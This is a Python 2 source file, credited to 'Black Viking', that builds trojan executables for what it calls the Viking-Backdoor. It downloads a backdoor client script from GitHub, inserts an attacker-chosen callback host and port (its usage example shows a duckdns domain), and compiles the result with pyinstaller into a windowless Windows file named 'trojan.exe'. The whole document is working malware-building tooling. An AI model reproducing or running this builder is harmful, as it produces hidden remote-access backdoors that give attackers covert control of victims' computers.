#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "15.04.2017"

import sys, os, subprocess, urllib2, colorama, shutil

def usage():
	print """
Usage:
----------------------
	python2 generate_exec.py 127.0.0.1 8080 trojan.exe
	---
	python2 generate_exec.py vkng.duckdns.org 1604 trojan.exe\n"""
	sys.exit()

def get_client(host, port):
	return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/Viking-Backdoor/master/source/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = 8000", "PORT = %s"%(port))

	
def generate_exec(host, port, source, name):
	print """
[-] Host: %s
[-] Port: %s
[-] Name: %s"""%(host, port, name)
	
	file = open(name.split(".")[0], "w")
	file.write(source)
	file.close()

	#cmd = "pyinstaller --onefile --noconsole %s"%(name.split(".")[0])
	cmd = subprocess.Popen(['pyinstaller', "--onefile", '--noconsole', name.split(".")[0]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	stdout, nothing = cmd.communicate()
	file = "%s%sdist%s%s"%(os.getcwd(), os.sep, os.sep, name)
	os.chdir("..")
	logfile = open("executables"+os.sep+name+"-pyinstallerLogFile.txt", "w")
	logfile.write(stdout)
	logfile.flush()  
	if os.path.exists(file) == True:
		shutil.copy2(file, "executables/"+name)
		shutil.rmtree("exec")
		print "\n[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+"executables"+os.sep+name)
	else:
		print "[!] Exe file couldn't create, check log file ==> %s"%(os.getcwd()+os.sep+"executables"+os.sep+logfile.name)
		shutil.rmtree("exec")
		sys.exit()

def main():
	if len(sys.argv) == 4:
		if os.path.exists("exec") == True:
			os.chdir("exec")
		else:
			os.mkdir("exec")
			os.chdir("exec")

		host = sys.argv[1]	
		port = sys.argv[2]
		name = sys.argv[3]
		
		source = get_client(host, port)

		generate_exec(host, port, source, name)

	else:
		usage()

if __name__ == "__main__":
	try:
		main()
	except Exception as e:
		print "[!] Error: %s"%(e)
	raw_input("\n[~] Press enter to exit...")
